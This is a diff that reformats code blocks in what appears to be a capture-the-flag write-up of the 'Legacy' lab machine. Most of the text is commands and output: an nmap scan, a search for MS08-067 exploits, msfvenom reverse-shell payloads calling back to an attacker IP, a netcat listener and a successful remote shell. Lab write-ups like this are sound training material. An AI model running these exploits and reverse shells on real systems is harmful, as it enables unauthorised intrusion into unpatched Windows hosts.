@@ -19,7 +19,7 @@
 
 ## Detection
 
-`
+```
 # nmap -sV --script *vuln* -oA nmap 10.10.10.4                                                                                                                                   [166/186]
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 20:55 CDT                                                                                                                               
 Nmap scan report for 10.10.10.4                                                                                            
@@ -77,11 +77,11 @@ Host script results:
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                                                                                                    
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                                                                                                          
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/     
-`
+```
 
 The first vulnerability for an RCE is MS08-067 related.  Let's start there:
 
-`
+```
 # searchsploit ms08-067
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                                                                              |  Path
@@ -93,13 +93,13 @@ Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Me
 Microsoft Windows Server - Universal Code Execution (MS08-067)                                                                                              | windows/remote/6841.txt
 Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                                                              | windows/remote/7132.py
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-`
+```
 
 ## Exploitation
 
 Multiple RCE's available.  Let's try the first Python one, windows/remote/40279.py
 
-`
+```
 # searchsploit -m 40279
   Exploit: Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)
       URL: https://www.exploit-db.com/exploits/40279
@@ -107,7 +107,7 @@ Multiple RCE's available.  Let's try the first Python one, windows/remote/40279.
 File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
 
 Copied to: /root/htb/legacy/40279.py
-`
+```
 
 Executing python 40279.py shows some missing depedencies of Impacket and PyCrypto.  Install with Pip.
 
@@ -116,22 +116,22 @@ pip install PyCrypto
 
 Checking the file, we need to generate our unique payload.  
 
-`
+```
 # grep msfvenom 40279.py 
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
 
-`
+```
 
 Seems simple enough.  Fire up msfvenom.
 
-`
+```
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python                                                
-`
+```
 
 The msfvenom ouptut is in an array called buf[], but the Python script uses shellcode[]. Search and replace to use buf[].  
 Okay, ready to execute and listen for incoming traffic on local port 443 with netcat.
 
-`
+```
 # grep Example 40279.py 
                                 print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
                                 print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
@@ -154,11 +154,11 @@ Exploit finish
 
 # nc -nvlp 443
 listening on [any] 443 ...
-`
+```
 
 The exploit finished, but I see nothing on port 443.  Let's check the options again.
 
-`
+```
 # grep -B1 "Windows XP" 40279.py 
         if (self.os=='1'):
                 print 'Windows XP SP0/SP1 Universal\n'
@@ -174,12 +174,12 @@ The exploit finished, but I see nothing on port 443.  Let's check the options ag
 --
 
                                 print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
-`
+```
 
 
 Oh, I forgot the check the OS version with nmap.  Checking now.
 
-`
+```
 # nmap -O 10.10.10.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 21:44 CDT
 Nmap scan report for 10.10.10.4
@@ -194,7 +194,7 @@ Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (92%), General Dyna
 OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
 Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 Server (89%)
 No exact OS matches for host (test conditions non-ideal).
-`
+```
 
 No exact match, but the aggressive guesses at 92% are either
 - Microsoft Windows XP SP2 or Windows Small Business Server 2003
@@ -210,7 +210,7 @@ https://github.com/andyacer/ms08_067
 
 Here the options for ms08_067_2018.py are a bit different:
 
-`
+```
 # git clone https://github.com/andyacer/ms08_067/git
 # grep "Example:" ms08_067_2018.py 
                 print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
@@ -220,28 +220,28 @@ Here the options for ms08_067_2018.py are a bit different:
                 print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
                 print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
                 print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
-`
+```
 
 And of course we need to generate a payload.
 
-`
+```
 # grep msfvenom ms08_067_2018.py 
 
 # Example msfvenom commands to generate shellcode:
 # msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
-`
+```
 
 So trying again with a listen on port 443:
 
-`
+```
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
-`
+```
 
 After replacing the payload, let's try option 6 for SP3 English:
 
-`
+```
 # python ms08_067_2018.py 10.10.10.4 6 445                                                                                                                                               
 #######################################################################
 #   MS08-067 Exploit                                                                                                                                                                         
@@ -280,7 +280,7 @@ Administrator            Guest                    HelpAssistant
 john                     SUPPORT_388945a0          
 The command completed with one or more errors.
 
-`
+```
 
 There we go.  A reverse shell is available on 443.  cd to C:\Documents and Settings\john for his flag.
 
